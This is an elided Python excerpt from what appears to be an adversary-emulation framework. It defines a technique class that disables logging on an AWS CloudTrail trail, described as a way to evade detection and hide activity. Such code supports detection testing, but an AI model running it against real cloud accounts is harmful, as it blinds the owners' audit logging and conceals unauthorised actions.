...
class AWSDisableCloudtrailLogging(BaseTechnique):
    def __init__(self):
        ...
        super().__init__(
            ...
            "This technique attempts to disable CloudTrail logs for a specified trail. Disabling CloudTrail logs can be used to evade detection and hide activities in the AWS environment.",
            mitre_techniques,
        )
    ...
    def execute(self, **kwargs: Any) -> Tuple[ExecutionStatus, Dict[str, Any]]:
        ...
        try:
            ...
            my_client.stop_logging(Name=trail_name)

            return ExecutionStatus.SUCCESS, {
                "message": f"Successfully disabled logging for trail {trail_name}",
                "value": {"trail_name": trail_name, "logging": "disabled"},
            }
